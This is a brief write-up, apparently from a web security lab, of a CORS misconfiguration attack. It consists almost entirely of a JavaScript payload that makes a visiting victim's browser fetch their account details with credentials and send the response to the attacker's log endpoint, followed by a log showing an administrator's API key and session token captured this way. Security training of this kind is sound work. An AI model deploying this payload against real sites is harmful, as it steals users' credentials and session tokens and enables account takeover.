
Host attacking script for victim to visit
```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script> 
```

Check log
```
172.31.31.148   2021-05-03 11:31:19 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22IAr0WCf1yYRVaMAnsLRbpQ7rOkER8NbY%22,%20%20%22sessions%22:%20[%20%20%20%20%22E55y0MDZ6JqMjfATXfzY1hfchIrFUwZt%22%20%20]} HTTP/1.1" 200 "User-Agent: Chrome/942646"
180.150.39.156  2021-05-03 11:31:19 +0000 "GET / HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0"
172.31.31.148   2021-05-03 11:31:19 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "User-Agent: Chrome/942646"
180.150.39.156  2021-05-03 11:31:20 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0"
180.150.39.156  2021-05-03 11:31:22 +0000 "POST / HTTP/1.1" 302 "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0"
180.150.39.156  2021-05-03 11:31:22 +0000 "GET /exploit HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0"
```
